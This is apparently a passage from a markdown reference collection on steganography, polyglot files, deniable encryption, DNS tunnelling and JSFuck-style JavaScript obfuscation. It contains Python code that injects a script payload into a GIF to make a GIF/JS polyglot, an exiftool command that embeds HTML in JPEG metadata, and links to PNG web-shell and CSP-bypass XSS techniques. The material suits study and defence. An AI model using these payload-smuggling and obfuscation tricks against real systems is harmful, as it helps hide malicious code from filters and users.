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" onload="imageLoaded.apply(this);">
	
	<canvas id="dest"></canvas>

- [owencm/js-steg: Javascript JPEG steganography library. Includes JS JPEG encoder and decoder with coefficient access helper functions.](https://github.com/owencm/js-steg)
- [Small JS library that packs your files into a PNG](https://github.com/claus/PNGDrive)
- [skeeto/pngarch: Archive files inside a PNG image](https://github.com/skeeto/pngarch)
- Compress data / JS code using pixels of a PNG: [Compression using Canvas and PNG-embedded data - Nihilogic](http://wayback.archive.org/web/20131209074604/http://blog.nihilogic.dk/2008/05/compression-using-canvas-and-png.html)
- [Colin Keigher: Going viral on Imgur with Powershell and PNG](http://colin.keigher.ca/2016/12/going-viral-on-imgur-with-powershell.html)
- [Using ImageMagick to reveal existence of hidden steganographic messages with DIY IM-simpleGUI tool | Guidance Blog](http://saisa.eu/blogs/Guidance/?p=1128)
- Hide data in Youtube video [Hijacking Youtube to transmit your Data – Hiding in plain sight](https://banmeihack.wordpress.com/2016/07/26/hijacking-youtube-to-transmit-your-data/) and [Hijacking YouTube to transmit your data | Hacker News](https://news.ycombinator.com/item?id=12166332)
- [week4 : 3 : Steganography and Image hiding](https://codepen.io/garethesn/pen/jbaarj)
- [petereigenschink/steganography.js: Hide secret messages with JavaScript and this library](https://github.com/petereigenschink/steganography.js/)
- [Virus Bulletin :: Script in a lossy stream](https://www.virusbulletin.com/virusbulletin/2015/03/script-lossy-stream)
	> You can perturb the input of the DCT so that a specific IDCT implementation will generate the desired output
	> 
	> In general signal-processing terms, this is known as preemphasis/equalisation --- since the communications channel will distort the signal in a known way, by sending a signal distorted appropriately in the opposite direction, it will arrive "undistorted" at the destination.
	> 
	> You can also consider using ECC codes, so that any small errors introduced can be corrected.
	> — https://news.ycombinator.com/item?id=17589503
- [Another nasty trick in malicious PDF](https://blog.avast.com/2011/04/22/another-nasty-trick-in-malicious-pdf/)

###### Hide data with combination

Prepend or append data. Easily detectable.

- ZIP and RAR can have prepend data before header
	>  The spec is specifically that the last header is the only valid header
	
	`zip` return a warning "extra bytes at beginning or within zipfile"

	- [Doesn't respect zip format · Issue #148 · gildas-lormeau/zip.js](https://github.com/gildas-lormeau/zip.js/issues/148)

	Ex: prepend data with a valid image
	
		zip -r secret.zip file1 file2
		cat cat.gif secret.zip > fun.gif
		# Upload fun.gif
		unzip fun.gif

###### VeraCrypt partition hidden in MP4 video

![VeraCrypt partition in MP4 file](http://keyj.emphy.de/files/tcsteg.svg)

- [KeyJ's Blog : Blog Archive » Real Steganography with TrueCrypt](http://keyj.emphy.de/real-steganography-with-truecrypt/)

###### Hidden partition in encrypted partition

Require 2 passwords. You can provide the first one if forced if the existance of the encrypted container is known (susception of encrypted data, ex: an image contains steganography data). But the revelated data can't prove an hidden data exist

volume: decoy (encrypted data) + outer (encrypted data of the hidden volume)

![The layout of a standard VeraCrypt volume before and after a hidden volume was created within it](https://download-codeplex.sec.s-msft.com/Download?ProjectName=veracrypt&DownloadId=931263)
![Example Layout of System Drive Containing Hidden Operating System](https://download-codeplex.sec.s-msft.com/Download?ProjectName=veracrypt&DownloadId=931269)

- can start the decoy operation system (normaly)
- can load additional volume
- can start the hidden operating system (require password)

- [Deniable encryption — Wikipedia](https://en.wikipedia.org/wiki/Deniable_encryption)
- [Plausible deniability — Wikipedia](https://en.wikipedia.org/wiki/Plausible_deniability)
- [Déni plausible (cryptologie) — Wikipédia](https://fr.wikipedia.org/wiki/D%C3%A9ni_plausible_%28cryptologie%29)
- [VeraCrypt - Documentation](https://veracrypt.codeplex.com/wikipage?title=Hidden%20Volume) - Hidden Volume
- [Add smart card support for outer and hidden volumes · Issue #2 · ggkitsas/cryptostick-truecrypt](https://github.com/ggkitsas/cryptostick-truecrypt/issues/2) - Volume Format
- [VeraCrypt - Documentation](https://veracrypt.codeplex.com/wikipage?title=VeraCrypt%20Hidden%20Operating%20System) - Hidden Operating System
- [VeraCrypt : comment chiffrer et cacher un OS complet](https://www.nextinpact.com/news/103280-veracrypt-comment-chiffrer-et-cacher-os-complet.htm)

###### Polyglot files

Note: About polyglot files contains HTML/JS. With Web browser, it could be blocked by `X-Content-Type-Options: nosniff` (for `<script src="image.jpg">`) to prevent CSP bypass. See:

Note: ZIP (APK, ODT, DOCX, JAR…), 7z, RAR, HTML, PDF (header must be in the first 1024 bytes) are not enforced to have the signature at offset 0 (could be prepend with something else)

- [1288361 – Return a network error for requests whose type is "script" and response has a MIME type that starts with image/](https://bugzilla.mozilla.org/show_bug.cgi?id=1288361)
- [433049 - Security: Block scripts that start with a valid image header - chromium - Monorail](https://bugs.chromium.org/p/chromium/issues/detail?id=433049)
- [Polyglot (computing) — Wikipedia](https://en.wikipedia.org/wiki/Polyglot_%28computing%29)
- [Schedule 31. Chaos Communication Congress](http://wayback.archive.org/web/20150423114933/https://events.ccc.de/congress/2014/Fahrplan/events/5930.html)
- https://events.ccc.de/congress/2014/Fahrplan/system/attachments/2562/original/Funky_File_Formats.pdf
- [Polyglot Inception: JPEG = CSS = JS = HTML](http://incept10n.com/)
- [International Journal of Proof-of-Concept or Get The Fuck Out (PoC||GTFO)](https://www.alchemistowl.org/pocorgtfo/)
	> 0x15 is a laser-projectable PDF that's also a ZIP containing, among other things, another PDF that is also a Git repo of its own source code.
	> 0x16 is a polyglot that is valid as a PDF document, a ZIP archive, and a Bash script that runs a Python webserver which hosts Kaitai Struct’s WebIDE which, allowing you to view the file’s own annotated bytes.
	> 0x17 is a PDF that's also a valid ZIP and valid firmware for Apollo Guidance Computer.
- Bulletproof Images: Hide payload in JPEG which will keep unchanged after libgd transformations
	Detect what bytes are not recreated after parsed and saved (image recreation)

	JPEG:
	- [Обход безопасной загрузки изображений - RDot](https://rdot.org/forum/showthread.php?t=2780) (generate an error, but works with GD)
	- [Bulletproof JPEGs - virtualabs.fr](http://www.virtualabs.fr/Nasty-bulletproof-Jpegs-l)
	PNG:
	- [Encoding Web Shells in PNG IDAT chunks | Application Security](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
	GIF:
	- [Exploiting PHP-GD imagecreatefromgif() function](https://github.com/fakhrizulkifli/Defeating-PHP-GD-imagecreatefromgif) - Proof-of-concept to exploit the flaw in the PHP-GD built-in function, imagecreatefromgif() 

###### Polyglot JPEG - ZIP file

Could also works with all other formats that support ICC: TIFF, GIF, JPEG 2000, [PSD](http://justsolve.archiveteam.org/wiki/Photoshop_Image_Resources)

ZIP data in JPEG survive image processing (resize, stripping EXIF data, recompressing, etc.)

Use ICC profiles, ICC profile chunk size limits (65376 for the first file, else 65521 for the others, this why the zip for bigger files must contains multipart .rar)

> In a JPEG file, an APP2 marker with an identifier of "ICC_PROFILE" is used for ICC profiles. See the ICC profile specification for details. Note that large ICC profiles must be split up, to accommodate JPEG's 64KB segment size limit. 

> Yes, if you open the file as text you will find the magic number of icc profile (acsp) follwoed by a bunch of random bytes and that of zip (PK/x03/x04). It is quite easy to append arbitrary data to JPEG files [0] and however there is no guarantee that it will survive image processing, so it was necessary to hide it within an ICC　profile. As for zip, unzip will happily decode any data stream as long as it makes sense and ignore the parts that don't.

> It isn't massively complex, but it did require some custom encoding/decoding logic.

- [Dаvіd Вucһаnаn on Twitter: "Assuming this all works out, the image in this tweet is also a valid ZIP archive, containing a multipart RAR archive, containing the complete works of Shakespeare. This technique also survives twitter's thumbnailer :P… https://t.co/glgrQSz7cK"](https://twitter.com/David3141593/status/1057042085029822464)
- [Dаvіd Вucһаnаn on Twitter: "Source code. This one is also a PDF :P… "](https://twitter.com/David3141593/status/1057609354403287040)
- [JPEG image of Shakespeare which is also a zip file containing his complete works | Hacker News](https://news.ycombinator.com/item?id=18342042)
- [Command-line Options @ ImageMagick](http://www.imagemagick.org/script/command-line-options.php#profile)

		curl 'https://pbs.twimg.com/media/DqteCf6WsAAhqwV.jpg' > tmp.zip  && unzip tmp.zip && unrar e shakespeare.part001.rar
		curl 'https://pbs.twimg.com/media/Dq1iEpfXgAADZRg.jpg' > tmp.pdf  && unzip tmp.pdf
	
		binwalk DqteCf6WsAAhqwV.jpg
		DECIMAL       HEXADECIMAL     DESCRIPTION
		--------------------------------------------------------------------------------
		0             0x0             JPEG image data, JFIF standard 1.01
		182           0xB6            Zip archive data, at least v1.0 to extract, ..., name: shakespeare.part001.rar
		...
		1971177       0x1E13E9        End of Zip archive

###### Polyglot JPEG - HTML file

This webpage is also a JPEG image: http://lcamtuf.coredump.cx/squirrel/.

1. The file is a valid jpeg file with some html in metadata
2. The server responds with `Content-Type: text/html`, making browser interpret the response body as html
3. Content before `<html>` tag are included in body (permissive behavior or HTML5), needed to be hidden
4. The html in the jpeg metadata ends with `<!--` , which starts html comment
5. The html has `<img src="#">` that renders the file as image (self reference)
 
	exiftool -comment='<style>*{visibility: hidden;} div{visibility: visible; position: absolute;}</style><div><h1>Web Scale Big Database</h1><img src="#"><!--' image.jpg
	mv image.jpg index.html

See https://www.reddit.com/r/programming/comments/4wak58/this_html_page_is_also_a_jpeg/d65fe6m

###### Polyglot GIF - JS file

[Funky File Formats \[31c3\] - YouTube](https://www.youtube.com/watch?v=Ub5G_t-gUBc&t=571) and https://speakerdeck.com/ange/funky-file-formats-31c3?slide=42

	header = (
		b'\x47\x49\x46\x38\x39\x61'  #Signature + Version  GIF89a
		b'\x2F\x2A' #Encoding /* it's a valid Logical Screen Width
		b'\x0A\x00' #Smal Logical Screen Height
		b'\x00' #GCTF
		b'\xFF' #BackgroundColor
		b'\x00' #Pixel Ratio
		b'\x2C\x00\x00\x00\x00\x2F\x2A\x0A\x00\x00\x02\x00\x3B' #GlobalColorTable + Blocks
		b'\x2A\x2F' #Commenting out */
		b'\x3D\x31\x3B' # enable the script side by introducing =1;
	)
	trailer = b'\x3B'
	# I made this explicit, step by step .
	f.write(header)
	f.write(payload)
	f.write(trailer)
	
	///////
	"""
	Injects the payload into existing GIF
	NOTE: if the GIF contains \xFF\x2A and/or \x2A\x5C might caouse issues
	"""
	# I know, I can do it all in memory and much more fast.
	# I wont do it here.
	with open(fname + "_malw.gif", "w+b") as fout:
		with open(fname, "rt") as fin:
			for line in fin:
				ls1 = line.replace(b'\x2A\x2F', b'\x00\x00')
				ls2 = ls1.replace(b'\x2F\x2A', b'\x00\x00')
				fout.write(ls2)
		fout.seek(6,0)
		fout.write(b'\x2F\x2A') #/*
		
	f = open(fname + "_malw.gif", "a+b") #appending mode
	f.write(b'\x2A\x2F\x3D\x31\x3B')
	f.write(payload)
	f.write(b'\x3B')

An other example:

- [Perl::Visualize - search.cpan.org](http://search.cpan.org/~jnagra/Perl-Visualize-1.02/Visualize.pm) and http://cpansearch.perl.org/src/JNAGRA/Perl-Visualize-1.02/Visualize.pm
- [ThinkFu › GIF/Javascript Polyglots](http://www.thinkfu.com/blog/gifjavascript-polyglots)

###### Polyglot JPEG - JS file

- [PortSwigger Web Security Blog: Bypassing CSP using polyglot JPEGs](http://blog.portswigger.net/2016/12/bypassing-csp-using-polyglot-jpegs.html)
- [JS Bin - Collaborative JavaScript Debugging](https://jsbin.com/kenuka/edit?html,output)
- http://portswigger-labs.net/csp/csp.php?x=%3Cscript%20charset=%22ISO-8859-1%22%20src=%22http://portswigger-labs.net/polyglot/jpeg/xss.jpg%22%3E%3C/script%3E
- [XSS and injection vulnerabilities](#xss-and-injection-vulnerabilities)

###### Polyglot PNG

> The idea is that PNG data can be interpreted depending on the Color Type among other types as RGB values (color type =2) or as indexed values (color type =3) together with a palette (PLTE). 

- [PNG Merge - YobiWiki](http://wiki.yobi.be/wiki/PNG_Merge)

###### Polyglot JSON - JS file

- [JSON hijacking for the modern web | Blog](https://portswigger.net/blog/json-hijacking-for-the-modern-web)
- [Why Facebook's api starts with a for loop - DEV Community 👩‍💻👨‍💻](https://dev.to/antogarand/why-facebooks-api-starts-with-a-for-loop-1eob)
- [Crafty Tricks for Avoiding XSSI | patorjk.com](http://patorjk.com/blog/2013/02/05/crafty-tricks-for-avoiding-xssi/)
- [api - How does including a magic prefix to a JSON response work to prevent XSSI attacks? - Information Security Stack Exchange](https://security.stackexchange.com/questions/110539/how-does-including-a-magic-prefix-to-a-json-response-work-to-prevent-xssi-attack)

###### Angecryption

> With Angecryption, you can basically encrypt anything into whatever you want

AES(A) = B; where A and B are documents (image, pdf, etc.)

	python2.7 angecrypt.py source target result [key] [algo] > decrypt.py
	# where algo could be aes
	#python2.7 -m pip install --user pycrypto

- [Fortinet Blog](https://blog.fortinet.com/2014/03/31/angecryption-at-insomni-hack)
- https://github.com/cryptax/angepoc
- https://code.google.com/archive/p/corkami/
- [when AES(☢) = ☠ --- a crypto-binary magic trick](http://www.slideshare.net/ange4771/when-aes-a-cryptobinary-magic-trick)
- [Joue à la crypto ! (french) // Speaker Deck](https://speakerdeck.com/ange/joue-a-la-crypto-french)
- https://www.blackhat.com/docs/eu-14/materials/eu-14-Apvrille-Hide-Android-Applications-In-Images.pdf
- [Encrypting a PNG into an Android application](https://github.com/cryptax/angeapk)

###### IP-over-DNS

> iodine lets you tunnel IPv4 data through a DNS server. This can be usable in different situations where internet access is firewalled, but DNS queries are allowed.

- [kryo.se: iodine (IP-over-DNS, IPv4 over DNS tunnel)](https://code.kryo.se/iodine/)

##### Esoteric programming languages

- [Esoteric programming language — Wikipedia](https://en.wikipedia.org/wiki/Esoteric_programming_language)
- [Brainfuck — Wikipedia](https://en.wikipedia.org/wiki/Brainfuck)
- [Brainfuck - Esolang](https://esolangs.org/wiki/Brainfuck)
- [Whitespace (programming language) — Wikipedia](https://en.wikipedia.org/wiki/Whitespace_%28programming_language%29)
- [Malbolge — Wikipedia](https://en.wikipedia.org/wiki/Malbolge)
- [Brainfuck minifier](https://mothereff.in/brainfuck-minifier) - [A brainfuck minifier written in JavaScript](https://github.com/mathiasbynens/brnfckr)
- [AA86 - Symbolic assembler demo](http://utf-8.jp/public/sas/) - Generate MS-DOS COM file with only symbols
- [Non-alpha PHP code](http://wayback.archive.org/web/20150319140303/http://sla.ckers.org/forum/read.php?24,36986)

###### JSFuck and similar

Valid JavaScript, use implicit type coercion.

See also [Obfuscation (code)](#obfuscation2028code29)

- [JSFuck — Wikipedia](https://en.wikipedia.org/wiki/JSFuck)
- [JSFuck - Write any JavaScript with 6 Characters: \[\]()!+](http://www.jsfuck.com/) - see https://github.com/aemkei/jsfuck/blob/master/jsfuck.js
- [JSF*ck - \[\]()!+](http://utf-8.jp/public/jsfuck.html) - **Broken**
- [Brainfuck beware: JavaScript is after you! | Patricio Palladino](http://patriciopalladino.com/blog/2012/08/09/non-alphanumeric-javascript.html) and https://github.com/alcuadrado/hieroglyphy
- [Converts javascript command into no alnum version using only []()+! characters](http://discogscounter.getfreehosting.co.uk/js-noalnum_com.php)
- [Java/script: no alnum cheat sheets](http://wayback.archive.org/web/20150420005536/http://sla.ckers.org/forum/read.php?24,33349,33405)
- [YAUC Less chars needed to run arbitrary JS code = 6! (JS GREAT WALL)](http://wayback.archive.org/web/20150319154336/http://sla.ckers.org/forum/read.php?24,32930)
- [Diminuitive NonAlNum JS - Arbitrary](http://wayback.archive.org/web/20111230091043/http://sla.ckers.org/forum/read.php?24,35081)
- [Diminutive JS Code Challenge, from OWASP](http://wayback.archive.org/web/20110708231619/http://sla.ckers.org/forum/read.php?24,30015)
- [Diminutive NoAlNum JS Contest](http://wayback.archive.org/web/20150319163133/http://sla.ckers.org/forum/read.php?24,28687)
- [Hackvertor](https://hackvertor.co.uk/public) [Hackvertor](http://www.businessinfo.co.uk/labs/hackvertor/hackvertor.php) - see ("Hacker" >) 3chr_nonalpha, aaencode, phpnonalpha, phpnonalpha2, hasegawa, etc.
- [aaencode - Encode any JavaScript program to Japanese style emoticons (^_^)](http://utf-8.jp/public/aaencode.html)
- [jjencode - Encode any JavaScript program using only symbols](http://utf-8.jp/public/jjencode.html)
- [Diminuitive NonAlNum JS - Arbitrary](http://wayback.archive.org/web/20111230091043/http://sla.ckers.org/forum/read.php?24,35081)
- [New JavaScript obfuscator: JScrambler](http://wayback.archive.org/web/20111230080027/http://sla.ckers.org/forum/read.php?24,33722)
- [Code Obfuscation Algorithms](http://wayback.archive.org/web/20131109221321/http://sla.ckers.org/forum/read.php?24,28674)
- [String hacks (ways to make a string)](http://wayback.archive.org/web/20131109230330/http://sla.ckers.org/forum/read.php?24,28642)
- [deobfuscation - How does this obfuscated javascript code work? - Stack Overflow](https://stackoverflow.com/questions/21955230/how-does-this-obfuscated-javascript-code-work/21955587)
- [obfuscation - Obfuscated javascript code with binary values? - Stack Overflow](https://stackoverflow.com/questions/3910353/obfuscated-javascript-code-with-binary-values)
- [obfuscation - How does this magic Javascript work? - Stack Overflow](https://stackoverflow.com/questions/22588223/how-does-this-magic-javascript-work)
- [KoreBlog javascript_deobfuscation](https://blog.korelogic.com/blog/2015/01/12/javascript_deobfuscation)
- [Edit fiddle - JSFiddle](http://jsfiddle.net/e6na63L8/)
- [DW56-1-JSObfuscation.pdf](http://www.digitalwhisper.co.il/files/Zines/0x38/DW56-1-JSObfuscation.pdf)
- [mame/jsfuck-quine: A JavaScript Quine written in the JSFuck style](https://github.com/mame/jsfuck-quine)
- [שלום עולם – JavaScript Written in the Hebrew Alphabet](http://aem1k.com/%D7%A9%D7%9C%D7%95%D7%9D-%D7%A2%D7%95%D7%9C%D7%9D/)
- [aurebesh.js – Translate JavaScript to Other Writing Systems](http://aem1k.com/aurebesh.js/)
 
- `13 + !0 === 14`
- `null == undefined`
- `+"3" === 3`, `isFinite(null) === true` (unary plus converting something into a number)
- `(null < 0) === false && (null > 0) === false && (null == 0) === false && (null === 0) === false` but `(null + 1) === 1`, `null <= 0 && null >= 0`, `!null === true` (null is integerflexible)
- `"200" - 0 === 200; "200" + 0 === 200`
 
	var $ = ~[];				// -1
	$ = {
		___: ++$,				// 0   : 	-1 + 1 is 0
		$$$$: (![] + "")[$],	// "f" : ![] is false, +"" converts false to "false" "false"[0] is "f"
		__$: ++$,				// 1   : 0 + 1 is 1
		$_$_: (![] + "")[$],	// "a" : "false"[1] is "a"
		_$_: ++$,				// 2   : 1 + 1 is 2
		$_$$: ({} + "")[$],		// "b" : {} is an object, +"" converts it to "[object Object]", "[Object object]"[2] is "b"
		$$_$: ($[$] + "")[$],	// "d" : 2[2] is undefined, +"" converts it to "undefined", "undefined"[2] is "d" 
		_$$: ++$,				// 3   : 2 + 1 is 3
		$$$_: (!"" + "")[$],	// "e" : !"" is true, +"" converts it to "true", "true"[3] is "e"
		$__: ++$,				// 4   : 3 + 1 is 4
		$_$: ++$,				// 5   : 4 + 1 is 5
		$$__: ({} + "")[$],		// "c" : {} is an object, +"" converts it to "[object Object]", "[Object object]"[5] is "c"
		$$_: ++$,				// 6   : 5 + 1 is 6
		$$$: ++$,				// 7   : 6 + 1 is 7
		$___: ++$,				// 8   : 7 + 1 is 8
		$__$: ++$				// 9   : 8 + 1 is 9
	};

	$.$_ = ($.$_ = $ + "")[$.$_$] + ($._$ = $.$_[$.__$]) + ($.$$ = ($.$ + "")[$.__$]) + ((!$) + "")[$._$$] + ($.__ = $.$_[$.$$_]) + ($.$ = (!"" + "")[$.__$]) + ($._ = (!"" + "")[$._$_]) + $.$_[$.$_$] + $.__ + $._$ + $.$;
	
	// Explanation:
	// $.$_ = "[object Object]"[5] + "[object Object]"[1] + "undefined"[2] + 
	// "false"[3] + "[object Object]"[6] + "true"[1] + "true"[2] + "c"+"t"+"o"+ "r";
	
	// Result:
	// $.$_ = "c"+"o"+"n"+"s"+"t"+"r"+"u"+"c"+"t"+"o"+"r";

	$.$$ = $.$ + (!"" + "")[$._$$] + $.__ + $._ + $.$ + $.$$;
	//     "r" + "true"[3]         + "t"  + "u" + "r" + "n" ;

	$.$ = ($.___)[$.$_][$.$_];

	// No alphanumeric characters, all 32 ASCII symbols
	-~!/#/^("\@"._*[,]>='<'?$&+_|$:``%{});// === 1

Then evaluate JavaScript. See [Parse JavaScript using the native parser](JavaScript#parse-javascript-using-the-native-parser)

	var w = this;
	for(p1 in w)
		// 110 = "n"
		// 114 = "r"
		if(p1.length == 9 && p1.charCodeAt(0) == 110 && p1.charCodeAt(8) == 114){
			break;
		}
	for(p2 in w[p1]){
		// 112 = "p"
		// 115 = "s"
		if(p2.length == 7 && p2.charCodeAt(0) == 112 && p2.charCodeAt(6) == 115){
			break;
		}
	}
	//w = "window", p1 = "navigator", p2 = "plugins"
	w[p1][p2]["length"];

	
> [The minus operator (`-`)](http://www.ecma-international.org/ecma-262/7.0/index.html#sec-subtraction-operator-minus) coerces both of its operands to numbers.
> [The plus operator (`+`)](http://www.ecma-international.org/ecma-262/7.0/index.html#sec-addition-operator-plus) is special in that it has two modes.
> First, its normal mode is adding two numbers. Therefore, many values are coerced to numbers
> Second, using plus for string concatenation is also supported. Therefore, as soon as one of the operands is a string, the other one is converted to a string, too
> The exact algorithm for + looks like this:
> 1. Ensure that both operands are primitives. Objects `obj` are converted to primitives via the internal operation `ToPrimitive(obj)`, which calls `obj.valueOf()` and – if that doesn’t work – `obj.toString()`. For dates, `obj.toString()` is called first.
> 2. If either operand is a string, then convert both to strings and return the concatenation of the results.
> 3. Otherwise, convert both operands to numbers and return the sum of the results.

